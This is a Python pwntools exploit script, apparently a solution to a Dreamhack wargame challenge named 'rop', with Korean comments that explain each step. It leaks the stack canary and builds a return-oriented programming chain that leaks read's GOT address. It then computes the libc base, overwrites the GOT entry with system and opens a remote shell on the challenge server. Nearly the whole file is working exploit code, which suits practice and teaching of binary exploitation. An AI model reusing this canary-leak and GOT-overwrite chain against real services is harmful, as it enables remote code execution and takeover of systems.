#!/usr/bin/env python3
# Name: rop.py

from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))  # 해당하는 변수에 대한 16진수 주소를 출력하는 함수

#p = process('./rop')
p = remote("host3.dreamhack.games", 11103)
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A' * 0x39           # 0x39 = 57     buf의 크기가 0x30이고 canary가 8바이트째부터 시작이나 canary의 첫 바이트는 항상 NULL 값이므로 NULL값인 1바이트까지 dummy로 덮는다.
p.sendafter(b'Buf: ', buf)  # Buf: 문자열을 수신하고 나서 dummy 데이터를 송신한다
p.recvuntil(buf)            # 송신한 buf 데이터를 다시 수신
cnry = u64(b'\x00' + p.recvn(7))        # canary = NULL + 무작위 7바이트 해서 총 8바이트 크기.
slog('canary', cnry)                    # 출력 결과 --> canary : 0x??????????

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
